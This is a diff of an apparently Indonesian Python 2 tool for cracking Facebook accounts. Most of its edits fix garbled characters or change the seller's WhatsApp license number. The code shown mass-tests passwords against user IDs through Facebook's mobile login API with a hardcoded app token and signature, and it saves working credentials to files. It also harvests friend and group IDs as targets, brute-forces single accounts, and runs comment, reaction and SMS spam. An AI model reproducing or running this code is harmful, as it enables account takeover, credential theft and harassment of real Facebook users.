@@ -75,7 +75,7 @@ vuln = '\x1b[32mVuln'
 try:
 	import requests
 except ImportError:
-	print '[Ã—] Modul requests belum terinstall!...\n'
+	print '[×] Modul requests belum terinstall!...\n'
 	os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
 reload(sys)
 sys.setdefaultencoding('utf8')
@@ -89,6 +89,11 @@ def random_ipv4():
 def random_ipv6():
 	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))
 
+
+id = []
+cp = []
+ok = []
+loop = 0
 
 ct = datetime.now()
 n = ct.month
@@ -166,7 +171,7 @@ def check_in(uid, pw):
 	except r.exceptions.TooManyRedirects:
 		print(" [!] Redirect overload")
 	if "c_user" in ses.cookies:
-		print(" [âœ“] akun ini tidak checkpoint")
+		print(" [✓] akun ini tidak checkpoint")
 	elif "checkpoint" in ses.cookies:
 		form = run.find("form")
 		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
@@ -197,25 +202,25 @@ def buatngecek():
 	dirs = os.listdir("CP")
 	print("")
 	for file in dirs:
-		print(" \033[1;96m[\033[1;97mÃ—\033[1;96m]\033[1;97m "+file)
+		print(" \033[1;96m[\033[1;97m×\033[1;96m]\033[1;97m "+file)
 	files = raw_input("\n \033[1;96m[\033[1;97m?\033[1;96m]\033[1;96m PILIH FILE \033[1;97m:\033[1;93m ")
 	try:
 		buka_baju = open(files,"r").readlines()
 	except FileNotFoundError:
-		print(" \033[1;96m[\033[1;97mÃ—\033[1;96m]\033[1;97m File tidak ada")
+		print(" \033[1;96m[\033[1;97m×\033[1;96m]\033[1;97m File tidak ada")
 		time.sleep(2); main()
 	print(" \033[1;96m[\033[1;97m+\033[1;96m]\033[1;96m Total Akun \033[1;97m:\033[1;93m "+str(len(buka_baju)))
-	print("\033[1;96mÂ¤"*48)
+	print("\033[1;96m¤"*48)
 	for memek in buka_baju:
 		kontol = memek.replace("\n","")
 		titid  = kontol.split("|")
-		print(" \033[1;96m[\033[1;97mÃ—\033[1;96m]\033[1;97m check: "+kontol)
+		print(" \033[1;96m[\033[1;97m×\033[1;96m]\033[1;97m check: "+kontol)
 		try:
 			check_in(titid[0], titid[1])
 		except requests.exceptions.ConnectionError:
 			continue
-		print("\033[1;96mÂ¤"*48)
-	print("\033[1;96mÂ¤"*48)
+		print("\033[1;96m¤"*48)
+	print("\033[1;96m¤"*48)
 	print("")
 	exit(" \33[3;1m\033[1;97mSelesai.....jangan lupa \33[0;1m\033[1;93mCOLMEX's \033[1;97m")
 	
@@ -288,7 +293,6 @@ def pilihlogin():
 
 def gen():
 	os.system('clear')
-	
 	print
 	cookie = raw_input(" \033[1;97m[\033[1;96m+[\033[1;97m] \033[1;96mMasukan Cookies \033[1;97m: ")
 	try:
@@ -322,7 +326,6 @@ def tokenz():
 	except (KeyError, IOError):
 		os.system('clear')
 		print
-		
 		token = raw_input('\n\033[1;97m [\033[1;96m+\033[1;97m] \033[1;96mMasukkan Token \033[1;97m: ')
 		try:
 			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
@@ -369,9 +372,6 @@ def menu():
 		print ('  [!] Tidak Ada Koneksi')
 		sys.exit()
 		    
-	print
-	print
-	jalan (' \33[3;1m\033[1;97mSelamat datang.....\33[0;1m')
 	
 	print
 	print" \033[1;96m[\033[1;97m01\033[1;96m] \033[1;97mCrack dari ID publik"
@@ -480,7 +480,7 @@ def pilih_india():
 		menu_spam()
 	elif ask == "0" or ask == "00":
 		os.system("rm -f login.txt") 
-		print (" âˆš   berhasil menghapus token") 
+		print (" √   berhasil menghapus token") 
 		exit()		
 		
 	else:
@@ -499,7 +499,7 @@ def pilih_india():
 
 	def main(arg):
 		global ok,cp,ua, loop
-		print '\r \033[1;97mÂ¤  %s/%s \033[1;97m[\033[1;96mOK:%s\033[1;97m] - \033[1;96m[\033[1;97mCP:%s\033[1;96m]\033[1;97m ' % (loop, len(id), len(ok), len(cp)),
+		print '\r \033[1;97m¤  %s/%s \033[1;97m[\033[1;96mOK:%s\033[1;97m] - \033[1;96m[\033[1;97mCP:%s\033[1;96m]\033[1;97m ' % (loop, len(id), len(ok), len(cp)),
 		sys.stdout.flush()
 		user = arg
 		uid,name=user.split("|") 
@@ -522,10 +522,10 @@ def pilih_india():
 				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
 				send=ses.get(api,params=param, headers=headers_)
 				if "access_token" in send.text and "EAAA" in send.text:
-					print '\r\033[1;97m ðŸ‘‰ \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m ' +uid+ ' \033[1;97mâ—Š\033[1;96m ' +pw+ '        '
-					ok.append(uid+' â€¢ '+pw)
+					print '\r\033[1;97m 👉 \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m ' +uid+ ' \033[1;97m◊\033[1;96m ' +pw+ '        '
+					ok.append(uid+' • '+pw)
 					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('\033[1;97m ðŸ‘‰ \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m '+str(uid)+' \033[1;97mâ—Š\033[1;96m '+str(pw)+'\n')
+					save.write('\033[1;97m 👉 \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m '+str(uid)+' \033[1;97m◊\033[1;96m '+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -537,20 +537,20 @@ def pilih_india():
 						data = s.get(url).json()
 						nama = data['name']
 						ttl = data['birthday'].replace("/","-")
-						print('\r\033[0;97m ðŸ‘‰ \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96mâ—Š\033[1;97m ' + pw + ' \033[1;96mâ—Š\033[1;97m ' + ttl)
+						print('\r\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + pw + ' \033[1;96m◊\033[1;97m ' + ttl)
 						cp.append(uid+'|'+pw+'|'+ttl)
 						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
-						save.write('\033[0;97m ðŸ‘‰ \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96mâ—Š\033[1;97m '+str(pw)+' \033[1;96mâ—Š\033[1;97m '+ttl+'\n')
+						save.write('\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+' \033[1;96m◊\033[1;97m '+ttl+'\n')
 						open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s\n"%(uid, pw, ttl))
 						save.close()
 						break
 					except(KeyError, IOError):
 						ttl = ' '
 					except:pass
-					print '\r\033[0;97m ðŸ‘‰ \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96mâ—Š\033[1;97m ' + pw + '        '
+					print '\r\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + pw + '        '
 					cp.append(uid+'|'+pw)
 					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
-					save.write('\033[0;97m ðŸ‘‰ \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96mâ—Š\033[1;97m '+str(pw)+'\n')
+					save.write('\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+'\n')
 					open("CP/%s.txt"%(tanggal),"a").write(" %s|%s\n"%(uid, pw))
 					save.close()
 					break
@@ -580,7 +580,7 @@ def manual():
 	
 	def main(arg):
 		global ok,cp,ua,loop
-		print '\r \033[1;97mÂ¤  %s/%s \033[1;97m[\033[1;96mOK:%s\033[1;97m] - \033[1;96m[\033[1;97mCP:%s\033[1;96m]\033[1;97m ' % (loop, len(id), len(ok), len(cp)),
+		print '\r \033[1;97m¤  %s/%s \033[1;97m[\033[1;96mOK:%s\033[1;97m] - \033[1;96m[\033[1;97mCP:%s\033[1;96m]\033[1;97m ' % (loop, len(id), len(ok), len(cp)),
 		sys.stdout.flush()
 		user = arg
 		uid,name=user.split("|") 
@@ -603,10 +603,10 @@ def manual():
 				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":asu,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
 				send=ses.get(api,params=param, headers=headers_)
 				if "access_token" in send.text and "EAAA" in send.text:
-					print '\r\033[1;97m ðŸ‘‰ \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m ' +uid+ ' \033[1;97mâ—Š\033[1;92m ' + asu + '        '
-					ok.append(uid+' â€¢ '+asu)
+					print '\r\033[1;97m 👉 \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m ' +uid+ ' \033[1;97m◊\033[1;92m ' + asu + '        '
+					ok.append(uid+' • '+asu)
 					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('\r\033[1;97m ðŸ‘‰ \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m '+str(uid)+' \033[1;97mâ—Š\033[1;96m '+str(asu)+'\n')
+					save.write('\r\033[1;97m 👉 \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m '+str(uid)+' \033[1;97m◊\033[1;96m '+str(asu)+'\n')
 					save.close()
 					break
 					continue
@@ -618,20 +618,20 @@ def manual():
 						data = s.get(url).json()
 						nama = data['name']
 						ttl = data['birthday'].replace("/","-")
-						print('\r\033[1;97m ðŸ‘‰ \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96mâ—Š\033[1;97m ' + asu + ' \033[1;96mâ—Š\033[1;97m ' + ttl)
+						print('\r\033[1;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + asu + ' \033[1;96m◊\033[1;97m ' + ttl)
 						cp.append(uid+'|'+asu+'|'+ttl)
 						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
-						save.write('\033[1;97m ðŸ‘‰ \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96mâ—Š\033[1;97m '+str(pw)+'\n')
+						save.write('\033[1;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+'\n')
 						open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s\n"%(uid, asu, ttl))
 						save.close()
 						break
 					except(KeyError, IOError):
 						ttl = ' '
 					except:pass
-					print '\r\033[1;97m ðŸ‘‰ \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96mâ—Š\033[1;97m ' + asu + '        '
+					print '\r\033[1;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + asu + '        '
 					cp.append(uid+'|'+asu)
 					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
-					save.write('\033[1;97m ðŸ‘‰ \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96mâ—Š\033[1;97m '+str(pw)+'\n')
+					save.write('\033[1;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+'\n')
 					open("CP/%s.txt"%(tanggal),"a").write(" %s|%s\n"%(uid, asu))
 					save.close()
 					break
@@ -687,13 +687,13 @@ def id_teman1():
         z = json.loads(r.text)
         print('\033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mMENGAMBIL SEMUA \033[1;96mID \033[1;97mTEMAN')
 	print('\033[1;97mjika ingin berhenti mengambil ID tekan \033[1;95mctrl \033[1;97m+\033[1;95m z')
-	jalan("\033[1;96mÂ¤"*48)
+	jalan("\033[1;96m¤"*48)
         print
         bz = open('out/id_teman.txt', 'w')
         for a in z['data']:
             idteman.append(a['id'])
             bz.write(a['id'] + '\n')
-            print '\r\x1b[1;96m [\x1b[1;97mâ€¢\x1b[1;96m] \x1b[1;97m' + str(len(idteman)) + '  \033[1;96mâ—Š\033[1;97m ',
+            print '\r\x1b[1;96m [\x1b[1;97m•\x1b[1;96m] \x1b[1;97m' + str(len(idteman)) + '  \033[1;96m◊\033[1;97m ',
             sys.stdout.flush()
             time.sleep(0.005)
             print '\x1b[1;97m' + a['id']
@@ -760,13 +760,13 @@ def idfrom_teman1():
         z = json.loads(r.text)
         print('\033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mMENGAMBIL SEMUA \033[1;96mID \033[1;97mTEMAN')
 	print('\033[1;97mjika ingin berhenti mengambil ID tekan \033[1;95mctrl \033[1;97m+\033[1;95m z')
-	jalan("\033[1;96mÂ¤"*48)
+	jalan("\033[1;96m¤"*48)
         print
         bz = open('out/id_teman_from_teman.txt', 'w')
         for a in z['friends']['data']:
             idfromteman.append(a['id'])
             bz.write(a['id'] + '\n')
-            print '\r\x1b[1;96m [\x1b[1;97mâ€¢\x1b[1;96m] \x1b[1;97m' + str(len(idfromteman)) + '  \033[1;96mâ—Š\033[1;97m ',
+            print '\r\x1b[1;96m [\x1b[1;97m•\x1b[1;96m] \x1b[1;97m' + str(len(idfromteman)) + '  \033[1;96m◊\033[1;97m ',
             sys.stdout.flush()
             time.sleep(0.005)
             print '\x1b[1;97m' + a['id']
@@ -810,7 +810,7 @@ def informasi():
         login()
     
     print
-    print("\033[1;96mÂ¤"*48)
+    print("\033[1;96m¤"*48)
     id = raw_input('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mMasukan ID/Nama\x1b[1;97m : \x1b[1;93m')
     print('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mTunggu sebentar \x1b[1;97m.....')
     r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
@@ -819,7 +819,7 @@ def informasi():
         if id in p['name'] or id in p['id']:
             r = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
             z = json.loads(r.text)
-            jalan ("\033[1;96mÂ¤"*48)
+            jalan ("\033[1;96m¤"*48)
 	    time.sleep(0.07)
 	    print
             try:
@@ -933,13 +933,13 @@ def mini():
         print '\x1b[1;96m[\x1b[1;97mINFO\x1b[1;96m] \x1b[1;96mTarget harus berteman dengan akun tumbal'
 	print
         try:
-            jalan ("\033[1;96mÂ¤"*48)
+            jalan ("\033[1;96m¤"*48)
 	    id = raw_input('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mID target :\x1b[1;93m ')
 	    r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
             a = json.loads(r.text)
 	    print '\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mNama      : \x1b[1;93m' + a['name']
             jalan('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mTunggu sebentar.....')
-            jalan ("\033[1;96mÂ¤"*48)
+            jalan ("\033[1;96m¤"*48)
 	    print
             jalan('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mMemeriksa')
             time.sleep(2)
@@ -1052,8 +1052,7 @@ def crack():
         login()
     else:
         os.system('reset')
-        
-        print("\033[1;96mÂ¤"*48)
+        print("\033[1;96m¤"*48)
         idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
         passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m: \x1b[1;97m')
         try:
@@ -1139,7 +1138,6 @@ def super():
         login()
 
     os.system('reset')
-   
     print 40 * '\x1b[1;97m\xe2\x95\x90'
     print '\x1b[1;37;40m1. Crack dari daftar Teman'
     print '\x1b[1;37;40m2. Crack dari member Grup'
@@ -1156,7 +1154,6 @@ def pilih_super():
     else:
         if peak == '1':
             os.system('reset')
-            
             print 40 * '\x1b[1;97m\xe2\x95\x90'
             jalan('\x1b[1;91m[+] \x1b[1;92mMengambil id teman \x1b[1;97m...')
             r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
@@ -1167,7 +1164,6 @@ def pilih_super():
         else:
             if peak == '2':
                 os.system('reset')
-                
                 print 40 * '\x1b[1;97m\xe2\x95\x90'
                 idg = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup   \x1b[1;91m:\x1b[1;97m ')
                 try:
@@ -1263,7 +1259,6 @@ def brute():
         login()
     else:
         os.system('reset')
-        
         print 40 * '\x1b[1;97m\xe2\x95\x90'
         try:
             email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail\x1b[1;97m/\x1b[1;92mHp \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
@@ -1345,7 +1340,6 @@ def menu_bot():
         login()
 
     os.system('clear')
-    
     print
     print '\x1b[1;36;40m[\x1b[1;37;40m1\x1b[1;36;40m]\x1b[1;37;40m Bot reactions target post'
     print '\x1b[1;36;40m[\x1b[1;37;40m2\x1b[1;36;40m]\x1b[1;37;40m Bot reactions group post'
@@ -1389,7 +1383,7 @@ def bot_pilih():
                     				bot_komen()
                 			else:
                     				if bots == '0':
-                        				grup_komen()
+                        				menu()
                     				else:
                              				print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + hack + ' \x1b[1;91mTidak ada'
                              				hack_pilih()
@@ -1466,14 +1460,14 @@ def react():
         time.sleep(1)
         login()
     else:
-        jalan("\033[1;96mÂ¤"*48)
+        jalan("\033[1;96m¤"*48)
         ide = raw_input('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mMasukan ID Target :\x1b[1;93m ')
         limit = raw_input('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mLimit             :\x1b[1;93m ')
         try:
             oh = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
             ah = json.loads(oh.text)
             jalan('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;92mTunggu sebentar.....')
-            jalan("\033[1;96mÂ¤"*48)
+            jalan("\033[1;96m¤"*48)
             for a in ah['feed']['data']:
                 y = a['id']
                 reaksi.append(y)
@@ -1560,7 +1554,7 @@ def reactg():
         time.sleep(1)
         login()
     else:
-        jalan("\033[1;96mÂ¤"*48)
+        jalan("\033[1;96m¤"*48)
         ide = raw_input('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mMasukan ID group :\x1b[1;93m ')
         limit = raw_input('\x1b[1;96m[\x1b[1;96m!\x1b[1;96m] \x1b[1;97mLimit            :\x1b[1;93m ')
         ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
@@ -1570,7 +1564,7 @@ def reactg():
             oh = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
             ah = json.loads(oh.text)
             jalan('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;92mTunggu sebentar.....')
-            jalan("\033[1;96mÂ¤"*48)
+            jalan("\033[1;96m¤"*48)
             for a in ah['feed']['data']:
                 y = a['id']
                 reaksigrup.append(y)
@@ -1597,7 +1591,7 @@ def bot_komen():
         login()
     else:
         print
-        jalan("\033[1;96mÂ¤"*48)
+        jalan("\033[1;96m¤"*48)
         ide = raw_input('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mMasukan ID target :\x1b[1;93m ')
         km = raw_input('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mMasukan komentar  :\x1b[1;93m ')
         limit = raw_input('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mLimit             :\x1b[1;93m ')
@@ -1605,7 +1599,7 @@ def bot_komen():
             p = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
             a = json.loads(p.text)
             jalan('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;92mTunggu sebentar.....')
-            jalan("\033[1;96mÂ¤"*48)
+            jalan("\033[1;96m¤"*48)
             for s in a['feed']['data']:
                 f = s['id']
                 komen.append(f)
@@ -1632,7 +1626,7 @@ def grup_komen():
         login()
     else:
     	print
-        jalan("\033[1;96mÂ¤"*48)
+        jalan("\033[1;96m¤"*48)
         ide = raw_input('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mMsukan ID group   :\x1b[1;93m ')
         km = raw_input('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mMasukan komentar  :\x1b[1;93m ')
         limit = raw_input('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mLimit             :\x1b[1;93m ')
@@ -1643,7 +1637,7 @@ def grup_komen():
             p = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
             a = json.loads(p.text)
             jalan('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;92mTunggu sebentar.....')
-            jalan("\033[1;96mÂ¤"*48)
+            jalan("\033[1;96m¤"*48)
             for s in a['feed']['data']:
                 f = s['id']
                 komengrup.append(f)
@@ -1669,9 +1663,9 @@ def unfriend():
 		time.sleep(0.01)
 		login()
 	print
-	jalan('\033[1;91m[âœº] \033[1;92mStart \033[1;97m...')
+	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
 	print "\033[1;97mStop \033[1;91mCTRL+C"
-	print 42*"\033[1;97mâ•"
+	print 42*"\033[1;97m═"
 	try:
 		pek = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
 		cok = json.loads(pek.text)
@@ -1700,7 +1694,6 @@ def menu_spam():
         time.sleep(1)
         login()
 
-    
     print
     print
     print '\x1b[1;36;40m[\x1b[1;37;40m1\x1b[1;36;40m] \x1b[1;37;40mSpam sms unlimited'
@@ -2448,7 +2441,6 @@ def tik():
         
 def lisen():
     os.system('clear')
-    
     jalan('\n\x1b[1;97m [*] Mohon tunggu ...');time.sleep(1.0)
     id = uuid.uuid4().hex[:25]
     idg = open('licensed.log', 'w')
@@ -2461,7 +2453,7 @@ def lisen():
     jalan ('\033[1;96m [\033[1;97m*\033[1;96m] \033[1;97mChat Admin Untuk Mengkonfirmasi Lisensi\x1b[1;39m')
     time.sleep(0.07)
     raw_input('\n\x1b[1;97m [*] Tekan Enter ')
-    os.system('am start https://wa.me/+6281370091378?text=Hi+Guys+Beli+Lisensi+dong.%20Lisensi:%20' + id + ' >/dev/null') 
+    os.system('am start https://wa.me/+62895341157823?text=Hi+Ratu+Beli+Lisensi+dong.%20Lisensi:%20' + id + ' >/dev/null') 
     time.sleep(1)
     os.sys.exit()
 def user1():
@@ -2470,14 +2462,12 @@ def user1():
         r = requests.get('https://github.com/tegarrevoer/License/blob/main/id').text.strip() # Jangan Di ganti bro'i nanti error
         if j in r:
             os.system('clear')
-            
             tik()
-            jalan('\n\033[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Lisensi \033[1;92mTersedia âœ“')
+            jalan('\n\033[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Lisensi \033[1;92mTersedia ✓')
             time.sleep(1)
             pilihlogin()
         else:
             os.system('clear')
-            
             tik()
             jalan ('\n\x1b[1;91m [*] Lisensi Tidak Tersedia !')
             time.sleep(1)
@@ -2485,7 +2475,7 @@ def user1():
             jalan ('\033[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Chat Admin Untuk Mengkonfirmasi Lisensi\x1b[1;39m')
             time.sleep(0.07)
             raw_input('\n\x1b[1;97m [*] Tekan Enter ')
-            os.system('am start https://wa.me/+6281370091378?text=Hi+Guys+Beli+Lisensi+dong.%20Lisensi:%20' + j + ' >/dev/null')
+            os.system('am start https://wa.me/+62895341157823?text=Hi+Ratu+Beli+Lisensi+dong.%20Lisensi:%20' + j + ' >/dev/null')
             os.sys.exit()
     except requests.exceptions.ConnectionError:
     	os.system('clear')
@@ -2503,9 +2493,8 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(0.01)
 		
-
 	
-     
+
 HUT = '\x1b[1;34m'
 H = '\x1b[1;37m'
 
